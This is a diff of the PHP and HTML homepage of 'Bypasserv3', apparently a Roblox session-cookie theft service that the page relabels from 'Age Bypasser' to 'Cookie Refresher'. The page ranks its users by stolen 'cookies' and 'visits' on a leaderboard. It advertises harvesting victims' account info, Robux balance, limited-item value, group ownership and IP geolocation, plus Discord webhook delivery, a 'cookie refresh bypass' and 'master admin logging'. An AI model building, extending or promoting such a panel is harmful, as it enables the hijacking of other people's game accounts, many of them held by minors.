@@ -1,15 +1,8 @@
 <?php
-/**
- * Bypasserv3 - Homepage
- */
-
 require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/functions.php';
 
-// Get global stats
 $stats = getGlobalStats();
-
-// Get leaderboard
 $leaderboard = getLeaderboard(5);
 ?>
 <!DOCTYPE html>
@@ -17,14 +10,14 @@ $leaderboard = getLeaderboard(5);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypasserv3 - Roblox Age Bypasser</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+    <title>Bypasserv3 - Roblox Cookie Refresher</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #8b5cf6;
-            --primary-dark: #7c3aed;
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
             --dark: #02040a;
             --darker: #0a0e27;
         }
@@ -49,7 +42,7 @@ $leaderboard = getLeaderboard(5);
         }
 
         .animated-gradient-text {
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
+            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
             background-size: 200% auto;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -68,15 +61,27 @@ $leaderboard = getLeaderboard(5);
 
         .hover-lift:hover {
             transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3);
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
         }
 
         .stat-counter {
             font-size: 3rem;
             font-weight: 700;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+        }
+
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            border-radius: 16px;
+            font-size: 28px;
+            margin-bottom: 16px;
         }
     </style>
 </head>
@@ -85,9 +90,9 @@ $leaderboard = getLeaderboard(5);
     <div class="container max-w-6xl mx-auto px-4 py-16">
         <div class="text-center mb-16">
             <div class="relative inline-block mb-8">
-                <div class="absolute inset-0 bg-purple-600/20 blur-3xl rounded-full"></div>
+                <div class="absolute inset-0 bg-blue-600/20 blur-3xl rounded-full"></div>
                 <div class="relative w-24 h-24 bg-white/5 border border-white/10 rounded-3xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect mx-auto">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    <span class="text-5xl">🍪</span>
                 </div>
             </div>
             
@@ -96,16 +101,16 @@ $leaderboard = getLeaderboard(5);
             </h1>
             
             <p class="text-white/60 text-xl mb-12 max-w-2xl mx-auto">
-                Advanced Roblox Age Verification Bypass System
+                Advanced Roblox Cookie Refresher & Bypass System
             </p>
             
             <div class="flex gap-4 justify-center flex-wrap">
-                <a href="/generator/" class="px-8 py-4 bg-white text-black rounded-2xl font-bold text-lg hover:bg-white/90 transition-all hover:scale-105 inline-flex items-center gap-3">
+                <a href="/generator/" class="px-8 py-4 bg-gradient-to-r from-blue-600 to-blue-500 text-white rounded-2xl font-bold text-lg hover:from-blue-700 hover:to-blue-600 transition-all hover:scale-105 inline-flex items-center gap-3 shadow-lg shadow-blue-500/50">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
                     Create Instance
                 </a>
                 
-                <a href="/dashboard/" class="px-8 py-4 bg-white/10 text-white border border-white/20 rounded-2xl font-bold text-lg hover:bg-white/15 transition-all hover:scale-105 inline-flex items-center gap-3 glass-effect">
+                <a href="/dashboard/sign-in.php" class="px-8 py-4 bg-white/10 text-white border border-white/20 rounded-2xl font-bold text-lg hover:bg-white/15 transition-all hover:scale-105 inline-flex items-center gap-3 glass-effect">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
                     Dashboard
                 </a>
@@ -143,9 +148,9 @@ $leaderboard = getLeaderboard(5);
                 <?php foreach ($leaderboard as $index => $user): ?>
                     <?php $rank = getRankInfo($user['totalCookies']); ?>
                     <div class="bg-white/5 rounded-xl p-4 flex items-center gap-4 hover:bg-white/10 transition-colors">
-                        <div class="text-2xl font-bold text-white/40">#<?php echo $index + 1; ?></div>
+                        <div class="text-2xl font-bold text-white/40 w-8">#<?php echo $index + 1; ?></div>
                         
-                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-purple-500/50">
+                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-blue-500/50">
                         
                         <div class="flex-1">
                             <div class="font-semibold text-white"><?php echo htmlspecialchars($user['username']); ?></div>
@@ -155,7 +160,7 @@ $leaderboard = getLeaderboard(5);
                         </div>
                         
                         <div class="text-right">
-                            <div class="font-bold text-purple-400"><?php echo number_format($user['totalCookies']); ?> cookies</div>
+                            <div class="font-bold text-blue-400"><?php echo number_format($user['totalCookies']); ?> cookies</div>
                             <div class="text-sm text-white/60"><?php echo number_format($user['totalVisits']); ?> visits</div>
                         </div>
                     </div>
@@ -165,23 +170,70 @@ $leaderboard = getLeaderboard(5);
         <?php endif; ?>
 
         <!-- Features -->
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="glass-effect rounded-2xl p-6 hover-lift">
-                <div class="text-4xl mb-4">🔒</div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-16">
+            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
+                <div class="feature-icon mx-auto">🔒</div>
                 <h3 class="text-xl font-bold mb-2">Secure</h3>
-                <p class="text-white/60">Military-grade security with advanced malware protection</p>
+                <p class="text-white/60">Military-grade security with advanced malware protection and rate limiting</p>
             </div>
             
-            <div class="glass-effect rounded-2xl p-6 hover-lift">
-                <div class="text-4xl mb-4">⚡</div>
+            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
+                <div class="feature-icon mx-auto">⚡</div>
                 <h3 class="text-xl font-bold mb-2">Fast</h3>
-                <p class="text-white/60">Lightning-fast processing with real-time stats</p>
+                <p class="text-white/60">Lightning-fast cookie refresh with real-time stats and instant webhooks</p>
             </div>
             
-            <div class="glass-effect rounded-2xl p-6 hover-lift">
-                <div class="text-4xl mb-4">📊</div>
+            <div class="glass-effect rounded-2xl p-6 hover-lift text-center">
+                <div class="feature-icon mx-auto">📊</div>
                 <h3 class="text-xl font-bold mb-2">Analytics</h3>
-                <p class="text-white/60">Comprehensive dashboard with detailed analytics</p>
+                <p class="text-white/60">Comprehensive dashboard with detailed analytics and leaderboards</p>
+            </div>
+        </div>
+
+        <!-- Features List -->
+        <div class="glass-effect rounded-2xl p-8">
+            <h2 class="text-3xl font-bold mb-6 text-center">✨ Full Features</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Account info fetching</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Robux balance display</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Premium status check</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Limited RAP calculation</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Group ownership detection</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>IP geolocation</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Game visit stats</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Rich Discord embeds</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Cookie refresh bypass</span>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="text-green-400 text-xl">✅</span>
+                    <span>Master admin logging</span>
+                </div>
             </div>
         </div>
     </div>
